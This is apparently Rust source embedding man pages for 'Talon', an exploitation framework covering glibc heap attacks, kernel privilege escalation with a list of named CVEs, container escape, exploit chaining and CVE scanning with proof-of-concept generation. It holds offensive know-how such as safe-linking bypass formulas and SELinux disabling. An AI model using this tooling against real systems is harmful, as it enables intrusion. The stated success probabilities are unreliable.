    heap_base: 0x0000555555554000
end
.fi

.SH FEATURES

.SS Safe-Linking Bypass (glibc 2.32+)
Automatically computes mangled pointers using the formula:
.nf
mangled = target ^ (chunk_address >> 12)
.fi

.SS Tcache Key Validation Bypass (glibc 2.35+)
Computes valid tcache key to bypass double-free detection:
.nf
key = chunk_address
.fi

.SS House of IO
Crafts fake _IO_FILE structure to hijack control flow during exit():
.RS
.IP \(bu 2
Overwrites _IO_list_all pointer
.IP \(bu 2
Constructs fake FILE with proper flags
.IP \(bu 2
Sets up vtable to call system()
.RE

.SS House of Apple
Modern technique that bypasses vtable validation in glibc 2.35+:
.RS
.IP \(bu 2
Crafts fake _IO_FILE_plus structure
.IP \(bu 2
Creates fake _IO_wide_data structure
.IP \(bu 2
Sets up fake wide vtable
.IP \(bu 2
Triggers _IO_wfile_overflow() → system()
.RE

.SS Largebin Attack
Exploits largebin insertion to write heap address to arbitrary location:
.RS
.IP \(bu 2
Corrupts victim->bk_nextsize
.IP \(bu 2
Triggers unsorted→largebin transition
.IP \(bu 2
Writes victim address to target
.RE

.SH GLIBC VERSION COMPATIBILITY

.TP
.B 2.23
Classic heap exploitation (fastbin, unsorted bin)

.TP
.B 2.27
Tcache introduced

.TP
.B 2.31
Pre-safe-linking (basic tcache poisoning)

.TP
.B 2.32
Safe-linking introduced (XOR pointer mangling)

.TP
.B 2.35
Tcache key validation, malloc/free hooks removed

.TP
.B 2.36 - 2.39
Modern mitigations (requires advanced techniques)

.SH CONSTRAINTS

.TP
.B Safe-Linking Bypass
.RS
.IP \(bu 2
Requires heap leak to obtain chunk address
.IP \(bu 2
Need UAF or overflow to corrupt tcache next pointer
.RE

.TP
.B Tcache Key Bypass
.RS
.IP \(bu 2
Requires heap leak for chunk address
.IP \(bu 2
Need ability to corrupt both next and key fields
.IP \(bu 2
Tcache must not be full (< 7 entries)
.RE

.TP
.B House of IO/Apple
.RS
.IP \(bu 2
Requires libc leak
.IP \(bu 2
Need arbitrary write to _IO_list_all
.IP \(bu 2
Must control FILE structure contents
.IP \(bu 2
Requires program to call exit() or crash
.RE

.SH SUCCESS PROBABILITIES
.TP
.B Tcache Poisoning (basic)
95% - Works on glibc <= 2.31

.TP
.B Tcache + Safe-Linking Bypass
92% - Requires heap leak

.TP
.B Tcache + Key Bypass
88% - Requires heap leak and key corruption

.TP
.B Largebin Attack
87% - Requires chunk metadata corruption

.TP
.B House of IO
85% - Requires libc leak and exit() trigger

.TP
.B House of Apple
80% - Most complex, highest mitigation bypass

.SH SEE ALSO
.BR talon (1),
.BR talon-rop (1),
.BR talon-auto-rop (1)
"#;

const TALON_KERNEL_MAN: &str = r#".TH TALON-KERNEL 1 "2026-01-08" "Talon 0.1.0"
.SH NAME
talon-kernel - Automated kernel exploitation framework with CVE detection

.SH SYNOPSIS
.B kernel_exploit

.SH DESCRIPTION
The
.B kernel_exploit
command provides comprehensive automated kernel exploitation capabilities including
vulnerability detection, protection bypass, privilege escalation, and container escape.
Supports Linux kernels 2.6.19 through 6.6+ with 7 known CVE exploits in the database.

.SH DSL SYNTAX
.nf
kernel_exploit
    auto_detect: true
    bypass_kaslr: true
    bypass_smep: true
    bypass_smap: true
    disable_selinux: true
    container_escape: true
end
.fi

.SH PARAMETERS
.TP
.B auto_detect
Automatically detect kernel version and scan for known vulnerabilities (true/false)

.TP
.B target_cve (optional)
Specific CVE to exploit (e.g., "CVE-2021-22555")

.TP
.B bypass_kaslr
Attempt to bypass Kernel Address Space Layout Randomization (true/false)

.TP
.B bypass_smep
Bypass Supervisor Mode Execution Prevention (true/false)

.TP
.B bypass_smap
Bypass Supervisor Mode Access Prevention (true/false)

.TP
.B disable_selinux
Disable SELinux enforcement after privilege escalation (true/false)

.TP
.B container_escape
Detect container environment and attempt escape (true/false)

.SH OUTPUT FILES
.TP
.B kernel_exploit.json
Complete exploitation solution with:
.RS
.IP \(bu 2
Detected vulnerabilities (CVE IDs)
.IP \(bu 2
Kernel version and architecture
.IP \(bu 2
Active security protections
.IP \(bu 2
Bypass chain details
.IP \(bu 2
Step-by-step exploitation guide
.IP \(bu 2
Success probability
.IP \(bu 2
Container escape vectors (if applicable)
.RE

.TP
.B kernel_exploit_payload.bin
Binary exploitation payload ready for injection

.SH EXAMPLES

.SS Example 1: Fully Automated Exploitation
.nf
kernel_exploit
    auto_detect: true
    bypass_kaslr: true
    bypass_smep: true
    bypass_smap: true
    disable_selinux: true
    container_escape: true
end
.fi

.SS Example 2: Specific CVE Targeting (Dirty Pipe)
.nf
kernel_exploit
    auto_detect: false
    target_cve: "CVE-2022-0847"
    bypass_kaslr: true
    bypass_smep: true
    disable_selinux: false
    container_escape: false
end
.fi

.SS Example 3: Minimal Exploitation (No Protection Bypass)
.nf
kernel_exploit
    auto_detect: true
    bypass_kaslr: false
    bypass_smep: false
    bypass_smap: false
    disable_selinux: false
    container_escape: false
end
.fi

.SH CVE DATABASE
The framework includes 7 high-exploitability kernel vulnerabilities:

.TP
.B CVE-2021-22555
Netfilter heap out-of-bounds write (2.6.19-5.11, 95% exploitability)
.br
Technique: msg_msg heap spray + OOB write in netfilter

.TP
.B CVE-2022-0847
Dirty Pipe - pipe buffer overwrite (5.8-5.16.11, 98% exploitability)
.br
Technique: Arbitrary file overwrite via pipe buffers

.TP
.B CVE-2021-3493
OverlayFS UAF in Ubuntu kernels (5.11.0, 92% exploitability)
.br
Technique: Use-after-free in overlayfs leading to privilege escalation

.TP
.B CVE-2022-34918
Netfilter nf_tables heap OOB (5.8-5.18.9, 88% exploitability)
.br
Technique: Out-of-bounds write in nf_tables

.TP
.B CVE-2023-2640
GameOver(lay) - OverlayFS privesc (6.2.0, 97% exploitability)
.br
Technique: OverlayFS privilege escalation via user namespace

.TP
.B CVE-2023-32629
Local privilege escalation via nftables (6.2.0, 90% exploitability)
.br
Technique: UAF in nf_tables batch processing

.TP
.B CVE-2024-1086
Netfilter nf_tables UAF (5.14-6.6, 93% exploitability)
.br
Technique: Use-after-free in Netfilter nf_tables

.SH FEATURES

.SS Kernel Information Gathering
Automatically detects:
.RS
.IP \(bu 2
Kernel version (via uname -r)
.IP \(bu 2
Architecture (x86_64, ARM, etc.)
.IP \(bu 2
Security protections (KASLR, SMEP, SMAP, KPTI, PTI)
.IP \(bu 2
Kernel configuration options
.RE

.SS KASLR Bypass Techniques
.RS
.IP \(bu 2
/proc/kallsyms leak (requires root or unprivileged_userns_clone)
.IP \(bu 2
/sys/kernel/notes parsing
.IP \(bu 2
Kernel module address estimation
.IP \(bu 2
Timing side-channel attacks
.RE

.SS SMEP/SMAP Bypass Techniques
.RS
.IP \(bu 2
CR4 register flip (disable bits 20 and 21)
.IP \(bu 2
ret2dir (return to physmap)
.IP \(bu 2
Physmap spray
.IP \(bu 2
Jump-Oriented Programming (JOP)
.RE

.SS Privilege Escalation Methods
.RS
.IP \(bu 2
commit_creds(prepare_kernel_cred(NULL))
.IP \(bu 2
Direct cred structure overwrite
.IP \(bu 2
Credential structure spray
.IP \(bu 2
modprobe_path overwrite
.IP \(bu 2
call_usermodehelper hijacking
.RE

.SS Container Escape Detection
Detects and exploits:
.RS
.IP \(bu 2
Docker containers (/.dockerenv, cgroup checks)
.IP \(bu 2
LXC containers
.IP \(bu 2
CAP_SYS_ADMIN capability abuse
.IP \(bu 2
Writable cgroup mounts
.IP \(bu 2
Exposed /dev/mem, /dev/kmem, /proc/kcore
.IP \(bu 2
debugfs access
.IP \(bu 2
Docker socket access
.RE

.SH KERNEL ROP CHAINS
Automatically generates ROP chains for:
.RS
.IP \(bu 2
Root shell spawning
.IP \(bu 2
SMEP/SMAP disable
.IP \(bu 2
Arbitrary memory read
.IP \(bu 2
Arbitrary memory write
.RE

.SH KERNEL HEAP EXPLOITATION
Supports kernel heap spray primitives:
.RS
.IP \(bu 2
msg_msg structures (arbitrary size and content)
.IP \(bu 2
subprocess_info (via userfaultfd + fork)
.IP \(bu 2
setxattr() extended attributes
.IP \(bu 2
sendmsg() socket buffers
.IP \(bu 2
Keyring objects
.RE

.SH SECURITY PROTECTIONS
The framework handles modern kernel mitigations:
.RS
.IP \(bu 2
KASLR (Kernel Address Space Layout Randomization)
.IP \(bu 2
SMEP (Supervisor Mode Execution Prevention)
.IP \(bu 2
SMAP (Supervisor Mode Access Prevention)
.IP \(bu 2
KPTI (Kernel Page Table Isolation)
.IP \(bu 2
Stack canaries
.IP \(bu 2
CFI (Control Flow Integrity)
.RE

.SH SUCCESS PROBABILITIES
Typical success rates for automated exploitation:
.RS
.IP \(bu 2
No protections: 95-99%
.IP \(bu 2
KASLR only: 85-95%
.IP \(bu 2
KASLR + SMEP: 75-90%
.IP \(bu 2
KASLR + SMEP + SMAP: 70-85%
.IP \(bu 2
All protections (KASLR + SMEP + SMAP + KPTI): 65-82%
.RE

.SH OUTPUT EXAMPLE
.nf
[KERNEL] ═══════════════════════════════════════════════════════════════
[KERNEL] KERNEL EXPLOIT AUTOMATION RESULT
[KERNEL] ═══════════════════════════════════════════════════════════════
[KERNEL]   Kernel Version: 5.15.0-91-generic
[KERNEL]   Vulnerabilities: CVE-2021-22555 (95%)
[KERNEL]   Active Protections: KASLR, SMEP, SMAP, KPTI
[KERNEL]   Container Environment: Yes
[KERNEL]   Success Probability: 81.2%
[KERNEL] ═══════════════════════════════════════════════════════════════

[KERNEL] EXPLOITATION STEPS:
[KERNEL]   1. Kernel information gathering complete
[KERNEL]   2. Bypass KASLR via /proc/kallsyms leak
[KERNEL]   3. Bypass SMEP/SMAP via CR4 register flip
[KERNEL]   4. Build privilege escalation chain
[KERNEL]     → commit_creds(prepare_kernel_cred(NULL))
[KERNEL]   5. Exploit CVE-2021-22555 (Netfilter heap out-of-bounds write)
[KERNEL]   6. Disable SELinux/AppArmor
[KERNEL]   7. Spawn root shell
[KERNEL]   8. Container escape via available vectors
.fi

.SH SUPPORTED PLATFORMS
.RS
.IP \(bu 2
Linux x86_64 (primary support)
.IP \(bu 2
Linux ARM64 (partial support)
.IP \(bu 2
Kernel versions: 2.6.19 - 6.6+
.RE

.SH LIMITATIONS
.RS
.IP \(bu 2
Requires Linux operating system
.IP \(bu 2
Some techniques require root/CAP_SYS_ADMIN
.IP \(bu 2
KASLR bypass may fail on hardened systems
.IP \(bu 2
Container escape requires specific misconfigurations
.RE

.SH NOTES
.B WARNING:
This tool is designed for authorized security testing, CTF competitions,
and vulnerability research only. Unauthorized use against systems you do not
own or have explicit permission to test is illegal.

The framework prioritizes safety and will:
.RS
.IP \(bu 2
Never execute exploits automatically without user confirmation
.IP \(bu 2
Provide detailed logging of all actions
.IP \(bu 2
Create backups before system modifications
.RE

.SH SEE ALSO
.BR talon (1),
.BR talon-rop (1),
.BR talon-heap (1),
.BR talon-auto-rop (1)
"#;

const TALON_CVE_MAN: &str = r#".TH TALON-CVE 1 "2026-01-08" "Talon 0.1.0"
.SH NAME
talon-cve - CVE scanner and automated impact assessment with exploit-db.com integration

.SH SYNOPSIS
.B scan_cve
.I target
[
.B check:
.I CVE_LIST
]

.SH DESCRIPTION
The
.B scan_cve
command provides comprehensive CVE vulnerability scanning with automated impact
assessment. Integrates with exploit-db.com for live CVE data while maintaining
offline functionality via local database. Detects vulnerable software versions,
validates patches, checks symbols, and generates proof-of-concept exploits.

.SH DSL SYNTAX
.nf
scan_cve "./target_binary"
    check: [CVE-2021-3156, CVE-2022-0847, CVE-2023-32233]
    suggest_exploit: true
    generate_poc: true
end
.fi

.SH PARAMETERS
.TP
.B target
Path to binary, library, or executable to scan for vulnerabilities

.TP
.B check
List of CVE IDs to check (e.g., [CVE-2021-3156, CVE-2022-0847])

.TP
.B suggest_exploit
Automatically suggest available exploit paths (true/false, default: true)

.TP
.B generate_poc
Generate proof-of-concept code for detected vulnerabilities (true/false, default: true)

.SH OUTPUT FILES
.TP
.B cve_scan_results.json
Complete scan results with:
.RS
.IP \(bu 2
Vulnerability status for each CVE
.IP \(bu 2
Confidence scores
.IP \(bu 2
Detected versions
.IP \(bu 2
Evidence and indicators
.IP \(bu 2
Risk assessment
.IP \(bu 2
Remediation recommendations
.RE

.TP
.B poc_cve_XXXX_YYYY.py
Generated proof-of-concept exploit code for each vulnerable CVE

.SH EXAMPLES

.SS Example 1: Basic CVE Scan
.nf
scan_cve "/usr/bin/sudo"
    check: [CVE-2021-3156]
    suggest_exploit: true
    generate_poc: true
end
.fi

.SS Example 2: Multiple CVE Check
.nf
scan_cve "./vulnerable_app"
    check: [
        CVE-2021-3156,
        CVE-2022-0847,
        CVE-2023-32233,
        CVE-2021-4034
    ]
    suggest_exploit: true
    generate_poc: true
end
.fi

.SS Example 3: Quick Scan Without PoC Generation
.nf
scan_cve "/lib/x86_64-linux-gnu/libc.so.6"
    check: [CVE-2022-0847]
    suggest_exploit: false
    generate_poc: false
end
.fi

.SH CVE DATABASE
The scanner includes a comprehensive local database with 8 high-impact CVEs:

.TP
.B CVE-2021-3156
Sudo Baron Samedit - Heap Buffer Overflow
.br
CVSS: 7.8 (High)
.br
Versions: 1.8.2 - 1.9.5p1
.br
Exploit: Available

.TP
.B CVE-2022-0847
Dirty Pipe - Arbitrary File Overwrite
.br
CVSS: 7.8 (High)
.br
Versions: 5.8 - 5.16.11
.br
Exploit: Available

.TP
.B CVE-2023-32233
Netfilter nf_tables UAF
.br
CVSS: 7.8 (High)
.br
Versions: 3.15 - 6.3.1
.br
Exploit: Available

.TP
.B CVE-2021-4034
PwnKit - Polkit pkexec LPE
.br
CVSS: 7.8 (High)
.br
Versions: 0.96 - 0.120
.br
Exploit: Available

.TP
.B CVE-2023-2640
GameOver(lay) - Ubuntu OverlayFS
.br
CVSS: 7.8 (High)
.br
Versions: 6.2.0
.br
Exploit: Available

.TP
.B CVE-2024-1086
Netfilter nf_tables UAF (2024)
.br
CVSS: 7.8 (High)
.br
Versions: 5.14 - 6.6
.br
Exploit: Available

.TP
.B CVE-2022-2586
Netfilter nf_tables Cross-Table UAF
.br
CVSS: 7.8 (High)
.br
Versions: 5.18 - 5.19.1
.br
Exploit: Available

.TP
.B CVE-2023-0179
Netfilter nfnetlink_osf UAF
.br
CVSS: 7.8 (High)
.br
Versions: 5.8 - 6.2.1
.br
Exploit: Available

.SH FEATURES

.SS Version Detection
.RS
.IP \(bu 2
Executes target with --version/-v flags
.IP \(bu 2
Parses version strings with regex
.IP \(bu 2
Compares against affected version ranges
.IP \(bu 2
Validates against patched versions
.RE

.SS Symbol Analysis
.RS
.IP \(bu 2
Uses nm -D for Linux binaries
.IP \(bu 2
Uses dumpbin /exports for Windows binaries
.IP \(bu 2
Checks for vulnerable function symbols
.IP \(bu 2
Validates patch indicators
.RE

.SS Patch Detection
.RS
.IP \(bu 2
Scans binary for patch indicator strings
.IP \(bu 2
Validates code-level fixes
.IP \(bu 2
Detects backported patches
.IP \(bu 2
Reduces false positives
.RE

.SS Exploit-DB Integration
.RS
.IP \(bu 2
Checks exploit-db.com availability via ping
.IP \(bu 2
Falls back to local database if offline
.IP \(bu 2
Provides exploit paths and references
.IP \(bu 2
Suggests exploitation techniques
.RE

.SS Risk Assessment
Calculates comprehensive risk scores based on:
.RS
.IP \(bu 2
Vulnerable CVE count
.IP \(bu 2
Exploit availability
.IP \(bu 2
Detection confidence
.IP \(bu 2
CVSS scores
.IP \(bu 2
Attack complexity
.RE

.SH OUTPUT EXAMPLE
.nf
[CVE] Initializing CVE Scanner & Impact Assessment
[CVE] ═══════════════════════════════════════════════════════════════
[CVE] Initializing local CVE database...
[CVE] [OK] Loaded 8 CVEs into local database
[CVE] Checking exploit-db.com availability...
[CVE] [OK] exploit-db.com is reachable - live updates available

[SCAN] Scanning target: /usr/bin/sudo
[SCAN] Checking 1 CVEs...
[SCAN] Checking CVE-2021-3156...
[SCAN] WARNING: VULNERABLE: CVE-2021-3156 (confidence: 100.0%)
[SCAN]     Exploit available: sudo/baron_samedit

[CVE] ═══════════════════════════════════════════════════════════════
[CVE] VULNERABILITY ASSESSMENT
[CVE] ═══════════════════════════════════════════════════════════════
[CVE] WARNING: CVE-2021-3156 - VULNERABLE
[CVE]     Confidence: 100.0%
[CVE]     Detected Version: 1.8.31
[CVE]     Evidence:
[CVE]       - Detected version: 1.8.31
[CVE]       - Vulnerable symbols found: set_cmnd
[CVE]       - No patch indicators detected
[CVE]     Suggested Exploit: sudo/baron_samedit
[CVE]     [OK] PoC generated: poc_cve_2021_3156.py

[CVE] ═══════════════════════════════════════════════════════════════
[CVE] RISK ASSESSMENT
[CVE] ═══════════════════════════════════════════════════════════════
[CVE]   Risk Score: 8.5/10.0
[CVE]   Vulnerable: 1/1
[CVE]   Exploitable: 1
[CVE] ═══════════════════════════════════════════════════════════════

[CVE] RECOMMENDATIONS:
[CVE]   • [CVE-2021-3156] Update to patched version immediately
[CVE]   • [CVE-2021-3156] Exploit available: sudo/baron_samedit - High priority fix

[CVE] Full scan results saved to: cve_scan_results.json
.fi

.SH SUPPORTED PLATFORMS
.RS
.IP \(bu 2
Linux (primary support with nm -D)
.IP \(bu 2
Windows (via dumpbin /exports)
.IP \(bu 2
macOS (partial support)
.RE

.SH CONFIDENCE SCORING
Confidence is calculated based on:
.RS
.IP \(bu 2
Version detection: +40%
.IP \(bu 2
Vulnerable symbols found: +30%
.IP \(bu 2
No patch indicators: +30%
.RE

Total confidence ranges from 0-100%, with scores above 70% indicating high confidence.

.SH LIMITATIONS
.RS
.IP \(bu 2
Requires target binary to support --version or -v flags for version detection
.IP \(bu 2
Symbol analysis requires nm (Linux) or dumpbin (Windows)
.IP \(bu 2
Patch detection is heuristic-based and may have false negatives
.IP \(bu 2
Local database may not include latest CVEs (check exploit-db.com manually)
.IP \(bu 2
Offline mode limited to 8 pre-loaded CVEs
.RE

.SH NOTES
.B WARNING:
This tool is designed for authorized security assessment, vulnerability research,
and defensive security operations. Unauthorized scanning of systems you do not
own or have explicit permission to test is illegal.

The scanner:
.RS
.IP \(bu 2
Respects exploit-db.com rate limits
.IP \(bu 2
Logs all scans for audit purposes
.IP \(bu 2
Generates PoCs for educational use only
.IP \(bu 2
Provides remediation guidance
.RE

.SH SEE ALSO
.BR talon (1),
.BR talon-kernel (1),
.BR talon-heap (1),
.BR talon-auto-rop (1)
"#;

const TALON_SIMILARITY_MAN: &str = r#".TH TALON-SIMILARITY 1 "2026-01-08" "Talon 0.1.0"
.SH NAME
talon-similarity - Binary similarity analysis with function embedding-based matching

.SH SYNOPSIS
.B find_similar_to
.I reference_binary
[
.B search_in:
.I PATTERN_LIST
]
[
.B threshold:
.I VALUE
]
[
.B output:
.I FORMAT
]

.SH DESCRIPTION
The
.B find_similar_to
command performs advanced binary similarity analysis using function embedding-based
matching. It identifies similar functions across binaries, detects vendor code reuse,
finds known vulnerable patterns, and supports cross-architecture matching.

.SH DSL SYNTAX
.nf
find_similar_to "./reference_binary"
    search_in: ["/lib/*.so", "/usr/bin/*"]
    threshold: 0.85
    output: json
end
.fi

.SH PARAMETERS
.TP
.B reference_binary
Path to the reference binary containing functions to match

.TP
.B search_in
List of glob patterns specifying binaries to search (e.g., ["/lib/*.so", "/usr/bin/*"])

.TP
.B threshold
Similarity threshold (0.0-1.0, default: 0.85). Higher values require closer matches

.TP
.B output
Output format: "text" or "json" (default: text)

.SH OUTPUT FILES
.TP
.B similarity_results.json
Complete analysis results with:
.RS
.IP \(bu 2
Function embeddings and feature vectors
.IP \(bu 2
Similarity scores and confidence ratings
.IP \(bu 2
Match types (exact, high similarity, vendor reuse, vulnerable)
.IP \(bu 2
Evidence for each match
.IP \(bu 2
Architecture information
.IP \(bu 2
Performance metrics
.RE

.SH EXAMPLES

.SS Example 1: Find Similar Functions in System Libraries
.nf
find_similar_to "/usr/bin/vulnerable_app"
    search_in: ["/lib/x86_64-linux-gnu/*.so*"]
    threshold: 0.85
    output: json
end
.fi

.SS Example 2: Detect Vendor Code Reuse
.nf
find_similar_to "./proprietary_binary"
    search_in: [
        "/usr/lib/*.so",
        "/opt/vendor/lib/*.so",
        "/lib64/*.so*"
    ]
    threshold: 0.90
    output: json
end
.fi

.SS Example 3: Cross-Architecture Vulnerability Search
.nf
find_similar_to "./x86_vulnerable.bin"
    search_in: [
        "/arm/binaries/*",
        "/mips/binaries/*",
        "/x86_64/binaries/*"
    ]
    threshold: 0.75
    output: json
end
.fi

.SS Example 4: Low Threshold Pattern Discovery
.nf
find_similar_to "./malware_sample"
    search_in: ["/suspicious/*.exe"]
    threshold: 0.70
    output: text
end
.fi

.SH FEATURES

.SS Function Embedding Generation
The engine extracts 16-dimensional feature vectors for each function:
.RS
.IP \(bu 2
Name hash-based features
.IP \(bu 2
Address-based features
.IP \(bu 2
Dangerous function detection (strcpy, sprintf, gets, system, malloc, free)
.IP \(bu 2
Function name length normalization
.IP \(bu 2
Binary signature
.IP \(bu 2
Architecture encoding (x86_64, i386, aarch64, arm)
.IP \(bu 2
Symbol visibility
.IP \(bu 2
Additional entropy features
.RE

.SS Similarity Matching
.RS
.IP \(bu 2
Cosine similarity for feature vector comparison
.IP \(bu 2
Confidence scoring based on architecture match, size similarity, instruction count
.IP \(bu 2
Match type classification: ExactMatch, HighSimilarity, PartialMatch, VendorCodeReuse, VulnerablePattern
.IP \(bu 2
Evidence collection for forensic analysis
.RE

.SS Vulnerable Pattern Database
Pre-loaded patterns for known dangerous code:
.RS
.IP \(bu 2
.B strcpy_unsafe
- Unbounded string copy operations
.IP \(bu 2
.B gets_dangerous
- Unsafe input reading
.IP \(bu 2
.B sprintf_overflow
- Format string buffer overflow
.IP \(bu 2
.B system_injection
- Command injection patterns
.IP \(bu 2
.B uaf_pattern
- Use-after-free patterns
.RE

.SS Vendor Code Signatures
Detects code from known libraries:
.RS
.IP \(bu 2
.B glibc_2.31
- GNU C Library functions
.IP \(bu 2
.B openssl_1.1.1
- OpenSSL cryptographic functions
.IP \(bu 2
.B zlib_1.2.11
- Compression library functions
.RE

.SS Cross-Platform Support
.RS
.IP \(bu 2
.B Linux:
nm, readelf for symbol extraction
.IP \(bu 2
.B Windows:
dumpbin for PE binary analysis
.IP \(bu 2
.B Architectures:
x86_64, i386, aarch64, arm, and more
.RE

.SH OUTPUT ANALYSIS

.SS Match Types
.TP
.B ExactMatch
Similarity >= 0.98 and identical function names

.TP
.B HighSimilarity
Similarity >= 0.90, different names or slight variations

.TP
.B PartialMatch
Similarity above threshold but below 0.90

.TP
.B VendorCodeReuse
Matches known vendor library signatures

.TP
.B VulnerablePattern
Matches known vulnerable code patterns (priority for security analysis)

.SS Confidence Scoring
Base confidence starts with similarity score and is enhanced by:
.RS
.IP \(bu 2
+10% for matching architecture
.IP \(bu 2
+5% for similar binary size (within 50 bytes)
.IP \(bu 2
+5% for similar instruction count (within 10 instructions)
.RE

Maximum confidence is capped at 100%

.SH PERFORMANCE

.SS Analysis Speed
.RS
.IP \(bu 2
Extracts 50-200 functions per second (varies by binary complexity)
.IP \(bu 2
Compares 10,000+ function pairs per second
.IP \(bu 2
Results sorted by similarity for quick triage
.RE

.SS Scalability
.RS
.IP \(bu 2
Handles binaries with 10,000+ functions
.IP \(bu 2
Glob pattern support for batch analysis
.IP \(bu 2
JSON export for large-scale correlation
.RE

.SH USE CASES

.SS Vulnerability Research
.RS
.IP \(bu 2
Identify similar vulnerable functions across binaries
.IP \(bu 2
Track patch propagation in vendor software
.IP \(bu 2
Find unpatched copies of known vulnerabilities
.RE

.SS Malware Analysis
.RS
.IP \(bu 2
Detect code reuse between malware families
.IP \(bu 2
Identify library functions in obfuscated binaries
.IP \(bu 2
Track malware evolution across variants
.RE

.SS License Compliance
.RS
.IP \(bu 2
Detect GPL code in proprietary software
.IP \(bu 2
Verify vendor claims about original code
.IP \(bu 2
Audit third-party library usage
.RE

.SS CTF & Reverse Engineering
.RS
.IP \(bu 2
Find similar challenge binaries for training
.IP \(bu 2
Identify standard library functions for faster analysis
.IP \(bu 2
Detect custom cryptographic implementations
.RE

.SH SUPPORTED BINARY FORMATS

.TP
.B ELF
Linux executables and shared objects

.TP
.B PE
Windows executables (.exe) and DLLs

.TP
.B Mach-O
macOS binaries (experimental)

.SH LIMITATIONS

.SS Symbol Information Required
.RS
.IP \(bu 2
Stripped binaries produce fewer matches
.IP \(bu 2
Static analysis only - no runtime behavior
.IP \(bu 2
Obfuscation reduces match accuracy
.RE

.SS Architecture Differences
.RS
.IP \(bu 2
Cross-architecture matches require lower thresholds
.IP \(bu 2
Compiler optimizations affect similarity scores
.IP \(bu 2
Inlined functions may not be detected
.RE

.SS False Positives
.RS
.IP \(bu 2
Common function patterns produce high similarity
.IP \(bu 2
Small functions (< 5 instructions) may match incorrectly
.IP \(bu 2
Threshold tuning required for specific use cases
.RE

.SH THRESHOLD RECOMMENDATIONS

.TP
.B 0.95-1.0
Exact or near-exact matches, minimal false positives

.TP
.B 0.85-0.95
High confidence matches, good for vulnerability detection

.TP
.B 0.75-0.85
Moderate matches, useful for vendor code reuse detection

.TP
.B 0.60-0.75
Low confidence, exploratory analysis, many false positives

.TP
.B < 0.60
Not recommended - too many false positives

.SH ADVANCED USAGE

.SS Batch Analysis
Combine with shell scripting:
.nf
for binary in /suspicious/*; do
    talon run analyze_$binary.talon
done
.fi

.SS JSON Post-Processing
Use jq for custom analysis:
.nf
jq '.matches[] | select(.vulnerable_indicators != [])' similarity_results.json
.fi

.SS Integration with Other Tools
Chain with CVE scanner:
.nf
# Find similar binaries, then scan for CVEs
find_similar_to "./app" ...
scan_cve "./matched_binary" ...
.fi

.SH SECURITY CONSIDERATIONS

.B WARNING:
This tool is designed for authorized security research, vulnerability analysis,
and defensive security operations. Use only on systems you own or have explicit
permission to analyze.

.RS
.IP \(bu 2
Binary analysis may trigger anti-malware tools
.IP \(bu 2
Analyze untrusted binaries in isolated environments
.IP \(bu 2
JSON output may contain sensitive path information
.IP \(bu 2
Vulnerable pattern detection is heuristic-based
.RE

.SH NOTES

The similarity engine uses machine learning-inspired techniques but does not
require GPU acceleration or training data. All computations are deterministic
and reproducible.

.SH SEE ALSO
.BR talon (1),
.BR talon-cve (1),
.BR talon-kernel (1),
.BR nm (1),
.BR readelf (1),
.BR dumpbin (1)
"#;

const TALON_CHAINING_MAN: &str = r#".TH TALON-CHAIN 1 "2026-01-08" "Talon 0.1.0"
.SH NAME
talon-chain \- Exploit chaining and multi-stage attack orchestration framework

.SH SYNOPSIS
.B connect_to
.I host
.B port
.I port
.RB [ timeout
.IR seconds ]
.br
.B send
.I data
.br
.B receive
.I size
.br
.B receive_until
.I delimiter
.B max
.I size
.br
.B exploit_leak
.I name
.B payload:
.I data
.B offset:
.I n
.B size:
.I bytes
.br
.B calculate_base
.I leaked
.B offset:
.I offset
.B as
.I name
.br
.B bruteforce_aslr
.B attempts:
.I n
.B payload:
.I data
.B offset:
.I n
.br
.B interactive
.br
.B save_chain_state
.I path
.br
.B load_chain_state
.I path
.br
.B chain_summary

.SH DESCRIPTION
.B talon-chain
provides a unified framework for orchestrating multi-stage exploitation attacks.
It handles network communication, information leak extraction, ASLR base calculation,
state persistence, and error recovery across complex exploitation workflows.

The exploit chaining engine automatically tracks leaked addresses, calculated bases,
and stage execution results. It integrates seamlessly with TALON's automated ROP
solver, heap exploitation framework, and CVE scanner.

.SH CORE WORKFLOW

The typical exploit chaining workflow follows these stages:

.IP 1. 3
.B Connection:
Establish TCP connection to the target using
.BR connect_to .

.IP 2. 3
.B Information Leak:
Extract memory addresses using
.BR exploit_leak ,
which automatically classifies the leak type (libc, stack, heap, PIE, canary).

.IP 3. 3
.B Base Calculation:
Compute ASLR base addresses using
.B calculate_base
with known offsets.

.IP 4. 3
.B Exploitation:
Build and send exploit payloads using variables populated with leaked addresses.

.IP 5. 3
.B Interactive Shell:
Drop into interactive mode using
.B interactive
after successful exploitation.

.IP 6. 3
.B State Persistence:
Save exploit state using
.B save_chain_state
for later resumption.

.SH COMMANDS

.SS CONNECTION MANAGEMENT
.TP
.BI "connect_to " "host " "port " port " " "[timeout " seconds ]
Establish TCP connection to target host. Default timeout is 5 seconds.
Connection info is automatically saved for reconnection attempts during
bruteforce operations.

.SS DATA TRANSFER
.TP
.BI "send " data
Send payload data to target. Accepts bytes or string expressions.
Automatically flushes the socket buffer.

.TP
.BI "receive " size
Receive up to
.I size
bytes from target. Returns data in
.B received_data
variable.

.TP
.BI "receive_until " "delimiter " "max " size
Receive data until
.I delimiter
is found or
.I size
bytes are received. Useful for reading until prompts or newlines.

.SS INFORMATION LEAKS
.TP
.BI "exploit_leak " "name " "payload: " data " offset: " n " size: " bytes
Send
.I payload
to target, extract
.I bytes
at
.I offset
from response, and classify the leak type.
Stores leaked value in
.B leaked_value
variable with confidence scoring.

Leak types automatically detected:
.RS
.IP \(bu 2
LibcAddress (0x7f0000000000 range)
.IP \(bu 2
StackAddress (0x7ffffffde000 range)
.IP \(bu 2
PIEBase (0x555555554000 range)
.IP \(bu 2
HeapAddress (userspace pointers)
.IP \(bu 2
Canary (stack cookies)
.IP \(bu 2
ReturnAddress (code pointers)
.RE

.TP
.BI "calculate_base " "leaked " "offset: " offset " as " name
Calculate base address from leaked value:
.I base
=
.I leaked
-
.IR offset .
Stores result in variable
.I name
and tracks in exploit state.

.SS ASLR BYPASS
.TP
.BI "bruteforce_aslr " "attempts: " n " payload: " data " offset: " n
Attempt up to
.I n
leak attempts, reconnecting between failures.
Useful for partial ASLR bypass on 32-bit systems or forking servers.
Automatically reconnects and retries until successful leak with confidence >= 70%.

.SS INTERACTIVE MODE
.TP
.B interactive
Drop into interactive shell mode. All input is forwarded to the target,
all output is displayed to the user. Type 'exit' or 'quit' to return.

.SS STATE MANAGEMENT
.TP
.BI "save_chain_state " path
Save current exploit state to JSON file, including:
.RS
.IP \(bu 2
All leaked addresses
.IP \(bu 2
Calculated base addresses
